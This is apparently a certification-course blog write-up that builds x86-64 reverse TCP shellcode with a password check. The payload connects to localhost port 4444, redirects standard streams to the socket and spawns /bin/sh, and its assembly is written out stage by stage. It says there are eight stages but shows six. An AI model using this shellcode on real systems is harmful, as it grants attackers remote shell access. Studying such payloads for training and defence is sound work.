# Reverse shell with Password

This assignment was split in two parts:
1. Create a nullbyte free version of the reverse tcp shellcode presented in class
2. Write a reverse tcp shellcode that spawns a shell after authentication

I first created a nullbyte-free version of the shellcode from the class and then extended it with an authentication mechanism. The shellcode consists of 8 stages:

## Init socket

I reused the first part of my bindshell shellcode to create a socket:

```
    push SYS_SOCKET
    pop rax
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    cdq

    syscall

    mov rdi, rax ; save socket

```

## Init the sockaddr_in

This part of the shellcode is equivalent to the following C snippet:
```
     server.sin_family = AF_INET
     server.sin_port = htons(PORT)
     server.sin_addr.s_addr = inet_addr("127.0.0.1")
     bzero(&server.sin_zero, 8)
```

As I did for the previous assignment I used shifts and the lower byte registers to create the struct:
```
    xor rax, rax
    push rax ; set sin_zero

    inc eax
    shl eax, 0x18
    add al, 0x7f
    shl rax, 0x10 ; set IP in struct

    add ax, 0x5c11; set port 4444
    shl rax, 0x10

    add al, 2; sin_family = AF_INET
    push rax ; RSP does now point to the struct
```

## Connect
In this part the connect syscall is executed in order to connect to the ip and port specified in the sockaddr_in struct.

C pseudocode equivalent:

```
    connect(sock, (struct sockaddr *)&server, sockaddr_len)
```

Assembly:
```
    push SYS_CONNECT
    pop rax ; Rax now contains the SYS_CONNECT syscall number
    mov rsi, rsp ; Rsp points to the sockaddr_in struct and is moved to rsi
    push 16
    pop rdx ; sockaddr_len in rdx
    syscall
```

## Authentication
Similar to the last assignment I read 4 bytes from stdin and compare them to the configured password. I store the read bytes in the sin_zero field of the sockaddr_in struct as we dont need it anymore and it saves me some bytes to create a null byte.
```
    sub rsi, 0x10 ; Reuse sin_zero from struct
    push 4
    pop rdx ; read 4 bytes
    xor rax,rax ; rax = syscall_read()
    syscall

    cmp dword[rsi], PASSWORD
    jne _burn ; Raise a sigsegv if the wrong password was entered.
```

## DUP2 loop
In this part I duplicate stdin,stout and stderr to the connected socket sothat we can communicate properly. Again I use a loop to iterate the file descriptors.

In C:
```
    dup2(client, STDIN)
    dup2(client, STDOUT)
    dup2(client, STERR)
```

```
    push 3 ; fd counter in rsi
    pop rsi

    _loop:

    dec esi ; we start with duplicating stderr
    push SYS_DUP2
    pop rax
    SYSCALL

    jne _loop ; terminate loop if stdin was duplicated
```

## Pop a shell
Again this is a very basic execve shellcode that spawns /bin/sh

```
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f ; /bin/sh
    push rbx
    mov rdi, rsp ; rdi points to /bin/sh
    push rax
    mov rdx, rsp ; rdx points to null
    push rdi
    mov rsi, rsp ; rsi points to /bin/sh
    add rax, 59
    syscall
```
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification. 

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert 

Student ID: SLAE64-1581
